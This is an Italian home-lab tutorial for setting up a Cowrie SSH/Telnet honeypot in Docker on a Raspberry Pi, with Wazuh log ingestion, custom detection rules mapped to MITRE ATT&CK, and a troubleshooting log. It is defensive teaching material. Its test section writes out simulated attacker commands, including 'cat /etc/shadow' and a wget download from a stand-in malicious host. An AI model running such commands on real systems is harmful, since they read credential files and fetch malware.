# Honeypot — Cowrie SSH/Telnet con integrazione Wazuh SIEM

Un progetto di cybersecurity per trasformare il Raspberry Pi in una "trappola" (Honeypot) capace di attirare attaccanti, registrare le loro azioni e analizzarle in tempo reale tramite un SIEM. Include la configurazione completa, le regole custom per Wazuh, e tutti i problemi che ho incontrato con le relative soluzioni.

---

## Teoria: Cos'e' un Honeypot

Un honeypot e' un sistema deliberatamente esposto e apparentemente vulnerabile, progettato per attirare attaccanti. Non contiene dati reali e non fa parte dell'infrastruttura produttiva — il suo unico scopo e' **osservare e registrare le tecniche di attacco**.

### Classificazione degli Honeypot

| Tipo | Interazione | Esempio | Rischio |
|---|---|---|---|
| **Low interaction** | Emula solo banner e login | Cowrie, Kippo, HoneyD | Basso — l'attaccante interagisce con un simulatore |
| **Medium interaction** | Emula servizi parziali | Cowrie (con comandi), Dionaea | Medio — comandi limitati ma credibili |
| **High interaction** | Sistema operativo reale, completo | VM dedicata, T-Pot | Alto — se l'attaccante evade, ha accesso alla rete |

### Cowrie: Medium-Interaction SSH/Telnet Honeypot

**Cowrie** emula un server SSH e Telnet con un filesystem finto (basato su Debian). Quando un attaccante si collega:

1. Puo' provare credenziali (brute force) — Cowrie accetta password comuni di proposito
2. Una volta "dentro", crede di essere su un vero server Linux
3. Puo' eseguire comandi (`ls`, `cat /etc/passwd`, `wget malware.exe`) — Cowrie simula le risposte
4. Se tenta di scaricare file (payload malevoli), Cowrie li cattura per analisi

Ogni azione viene registrata in formato JSON nel file `cowrie.json`, con timestamp, IP sorgente, username, password, comandi eseguiti.

### MITRE ATT&CK Mapping

I comportamenti catturati da Cowrie mappano direttamente alle tecniche del framework MITRE ATT&CK:

| Evento Cowrie | Tecnica MITRE ATT&CK | ID |
|---|---|---|
| Tentativo di login (brute force) | Brute Force: Password Guessing | T1110.001 |
| Login riuscito con credenziali deboli | Valid Accounts: Default Accounts | T1078.001 |
| Esecuzione comandi post-login | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Download di file malevoli | Ingress Tool Transfer | T1105 |
| Ricognizione (`whoami`, `uname -a`) | System Information Discovery | T1082 |

---

## Architettura del progetto

```
Attaccante (Internet/LAN)
    │
    │ SSH porta 2222
    ▼
[Cowrie Container] ──log JSON──→ [Wazuh Agent] ──events──→ [Wazuh Manager]
                                                                │
                                                                ▼
                                                         [Wazuh Indexer]
                                                                │
                                                                ▼
                                                         [Wazuh Dashboard]
                                                         (Alert + Threat Hunting)
```

Il flusso completo:

1. **L'attaccante** si collega alla porta 2222 (esposta da Cowrie, non la vera porta SSH 22)
2. **Cowrie** registra tutto in `/var/log/cowrie/cowrie.json` (IP, password, comandi)
3. **L'agente Wazuh** monitora quel file in tempo reale (tail -f concettuale)
4. **Wazuh Manager** riceve gli eventi, li decodifica con il decoder JSON e li confronta con le regole
5. Se una regola fa match, genera un **alert** che appare sulla Dashboard

---

## Prerequisiti

- Raspberry Pi con Docker e Docker Compose installati
- Wazuh Manager e Agent installati (All-in-One sul Pi o Manager su server esterno)
- Porta 2222 libera (non occupata da altri servizi)

---

## Installazione Passo-Passo

### Step 1: Setup di Cowrie con Docker

#### Creazione delle directory

```bash
mkdir -p ~/cowrie/var/log/cowrie
mkdir -p ~/cowrie/etc
cd ~/cowrie
```

La struttura `var/log/cowrie` sara' montata come volume nel container — i log di Cowrie verranno scritti qui, dove Wazuh potra' leggerli.

#### Docker Compose

Creare il file `docker-compose.yml`:

```yaml
version: "3"
services:
  cowrie:
    image: cowrie/cowrie:latest
    container_name: cowrie
    restart: always
    ports:
      - "2222:2222"  # Porta SSH Honeypot
      - "2223:2223"  # Porta Telnet Honeypot
    volumes:
      # Monta SOLO i log — NON montare /etc (vedi Troubleshooting Errore 1)
      - ./var/log/cowrie:/cowrie/cowrie-git/var/log/cowrie
```

> **Perche' la porta 2222 e non la 22:** La porta 22 e' occupata dal vero server SSH del Raspberry Pi. Se usassimo la 22 per l'honeypot, perderemmo l'accesso SSH reale al sistema. In un deployment di produzione, si potrebbe fare NAT per esporre la porta 2222 come porta 22 verso Internet (dal punto di vista dell'attaccante, sembra un normale SSH).

#### Avvio

```bash
docker compose up -d
```

Verifica che il container sia in esecuzione:

```bash
docker ps | grep cowrie
# Stato atteso: Up X minutes (non "Restarting")
```

### Step 2: Configurazione Wazuh per ingestione log Cowrie

Dobbiamo istruire l'agente Wazuh a monitorare il file JSON prodotto da Cowrie.

#### Modifica di ossec.conf

Aprire il file di configurazione dell'agente Wazuh:

```bash
sudo nano /var/ossec/etc/ossec.conf
```

Aggiungere questo blocco **prima** del tag di chiusura `</ossec_config>`:

```xml
<localfile>
  <log_format>json</log_format>
  <location>/home/<tuo_utente>/cowrie/var/log/cowrie/cowrie.json</location>
</localfile>
```

**Cosa fa:** Istruisce l'agente Wazuh a:

1. Monitorare il file specificato in tempo reale (come `tail -f`)
2. Parsare ogni nuova riga come JSON (non come syslog tradizionale)
3. Inviare gli eventi parsati al Wazuh Manager per l'analisi

#### Fix dei permessi

Docker crea i file di log con l'utente interno del container. Wazuh (che gira come utente `wazuh` o `ossec`) potrebbe non riuscire a leggerli:

```bash
sudo chmod -R 755 /home/<tuo_utente>/cowrie/var/log/cowrie/
```

> **Nota:** In un ambiente di produzione, sarebbe meglio usare ACL o aggiungere l'utente `wazuh` al gruppo del container. Il `chmod 755` e' la soluzione rapida per un home lab.

#### Riavvio dell'agente

```bash
sudo systemctl restart wazuh-agent
# oppure, se e' all-in-one:
sudo /var/ossec/bin/wazuh-control restart
```

---

## Regole Custom per Wazuh

Le regole di default di Wazuh non coprono gli eventi specifici di Cowrie. Ho dovuto creare regole personalizzate per generare alert sulla dashboard.

### File: `/var/ossec/etc/rules/local_rules.xml`

```xml
<group name="local,syslog,sshd,">

  <!-- Regola base: cattura QUALSIASI evento Cowrie -->
  <rule id="100010" level="3">
    <decoded_as>json</decoded_as>
    <field name="eventid" type="pcre2">^cowrie\.</field>
    <description>Cowrie: Attivita' generica Honeypot rilevata</description>
  </rule>

  <!-- Tentativo di login fallito (Brute Force) -->
  <rule id="100011" level="5">
    <if_sid>100010</if_sid>
    <field name="eventid">cowrie.login.failed</field>
    <description>Cowrie: Tentativo di accesso fallito (Brute Force)</description>
    <group>authentication_failed,pci_dss_10.2.4,pci_dss_10.2.5,</group>
  </rule>

  <!-- Login riuscito — CRITICO: un attaccante e' "dentro" l'honeypot -->
  <rule id="100012" level="10">
    <if_sid>100010</if_sid>
    <field name="eventid">cowrie.login.success</field>
    <description>Cowrie: INTRUSIONE RIUSCITA — Un attaccante e' entrato nell'Honeypot</description>
    <mitre>
      <id>T1078</id>  <!-- Valid Accounts -->
    </mitre>
    <group>authentication_success,pci_dss_10.2.5,</group>
  </rule>

  <!-- Esecuzione comandi — l'attaccante sta esplorando -->
  <rule id="100013" level="7">
    <if_sid>100010</if_sid>
    <field name="eventid">cowrie.command.input</field>
    <description>Cowrie: L'attaccante ha digitato un comando nell'Honeypot</description>
  </rule>

</group>
```

### Spiegazione delle regole

**Struttura gerarchica:** La regola `100010` e' la regola padre che cattura qualsiasi evento Cowrie (il campo `eventid` inizia con `cowrie.`). Le regole figlie (`100011-100013`) usano `<if_sid>100010</if_sid>` per attivarsi solo se la regola padre ha fatto match — questo evita di riscrivere la condizione JSON in ogni regola.

**Livelli di allarme (level):**

| Level | Significato | Azione suggerita |
|---|---|---|
| 3 | Informativo | Log silenzioso |
| 5 | Attenzione | Notifica se configurata |
| 7 | Rilevante | Investigare |
| 10 | Critico | Azione immediata |

**Tag MITRE `<id>T1078</id>`:** Associa l'alert alla tecnica MITRE ATT&CK "Valid Accounts". Questo permette di filtrare gli alert per tecnica nella dashboard Wazuh e di correlare con altri eventi.

**Tag PCI DSS:** `pci_dss_10.2.4` e `pci_dss_10.2.5` mappano i requisiti PCI DSS per il logging degli accessi falliti e riusciti. Utile se il progetto viene presentato in contesto compliance.

### Validazione delle regole

Prima di applicare le regole in produzione, testarle con `wazuh-logtest`:

```bash
sudo /var/ossec/bin/wazuh-logtest
```

Incollare un esempio di log JSON di Cowrie e verificare che la regola corretta faccia match.

---

## Troubleshooting — Esperienza Personale

### Errore 1: Container in restart loop infinito

**Sintomo:** `docker ps` mostra lo stato "Restarting" e `docker logs cowrie` mostra:

```
twistd: Unknown command: cowrie
```

**Causa:** Nel `docker-compose.yml` avevo mappato il volume `./etc:/cowrie/cowrie-git/etc`, sovrascrivendo la cartella di configurazione interna del container con una directory **vuota** dell'host. Cowrie non trovava piu' i suoi file di configurazione e non poteva avviarsi.

**Soluzione:** Ho rimosso il volume `./etc` dal Docker Compose, lasciando che il container usi la configurazione di default integrata nell'immagine. Montare solo i **log**, non la configurazione, a meno di avere una config personalizzata pronta.

**Lezione:** Montare un volume vuoto sopra una directory non-vuota del container la rende vuota dentro il container. Docker **sovrascrive** il contenuto del container con quello dell'host, non il contrario.

### Errore 2: Wazuh — "Too many fields for JSON decoder"

**Sintomo:** La dashboard Wazuh non mostrava nessun evento Cowrie. Il file `/var/ossec/logs/ossec.log` conteneva:

```
analysisd: ERROR: Too many fields for JSON decoder
```

**Causa:** I log JSON di Cowrie sono molto ricchi di dettagli (ogni evento puo' avere 20-30 campi). Il decoder JSON di Wazuh ha un limite predefinito sul numero di campi analizzabili per evento.

**Soluzione:** Ho aumentato il buffer del decoder modificando `/var/ossec/etc/local_internal_options.conf`:

```properties
analysisd.decoder_order_size=1024
```

Dopo la modifica, riavviare Wazuh:

```bash
sudo /var/ossec/bin/wazuh-control restart
```

### Errore 3: "Connection Refused" durante i test

**Sintomo:** Da Kali Linux, il comando `ssh -p 2222 root@127.0.0.1` dava "Connection refused".

**Causa:** `127.0.0.1` (localhost) e' raggiungibile solo dalla macchina stessa. Se testi da un **altro** computer (Kali Linux), devi usare l'IP LAN del Raspberry Pi.

**Soluzione:**

```bash
# ERRATO (da un altro PC)
ssh -p 2222 root@127.0.0.1

# CORRETTO (da un altro PC)
ssh -p 2222 root@192.168.0.102
```

### Errore 4: Log presenti ma Dashboard vuota

**Sintomo:** Wazuh riceveva i log (verificato con `logall_json` in debug mode), ma la dashboard non mostrava nessun alert grafico.

**Causa:** Mancavano le regole custom XML. Wazuh riceveva gli eventi JSON ma non sapeva come classificarli — senza una regola che fa match, l'evento viene registrato nei log interni ma non genera un alert visibile sulla dashboard.

**Soluzione:** Ho creato le regole custom (sezione sopra) e le ho validate con `wazuh-logtest` prima di applicarle. Dopo il riavvio, gli alert hanno iniziato ad apparire.

---

## Test Finale

Per verificare che tutto il sistema funzioni end-to-end:

### 1. Simulare un attacco brute force

Da un altro PC (es. Kali Linux):

```bash
ssh -p 2222 root@<IP_RASPBERRY>
```

Inserire password a caso — ogni tentativo fallito genera un evento `cowrie.login.failed` → alert Wazuh rule 100011.

### 2. Simulare un'intrusione

Inserire una password debole come `root`, `12345`, `password` — Cowrie le accetta deliberatamente. Questo genera un evento `cowrie.login.success` → alert Wazuh rule 100012 (livello 10 = critico).

### 3. Eseguire comandi post-intrusione

Una volta "dentro" l'honeypot:

```bash
whoami          # Genera alert rule 100013
ls              # Genera alert rule 100013
cat /etc/shadow # Genera alert rule 100013 — l'attaccante cerca credenziali
wget http://malicious-site.com/malware  # Cowrie cattura il tentativo di download
```

### 4. Verificare sulla Dashboard Wazuh

Andare su **Threat Hunting** e filtrare per:

- `rule.id: 100012` — mostra tutte le intrusioni riuscite nell'honeypot
- `rule.id: 100013` — mostra tutti i comandi eseguiti dagli attaccanti
- `rule.mitre.id: T1078` — filtra per tecnica MITRE ATT&CK

---

Prossimo step: [SOC Analyst / Wazuh](../SOC%20Analyst/) — installazione e configurazione del SIEM Wazuh.
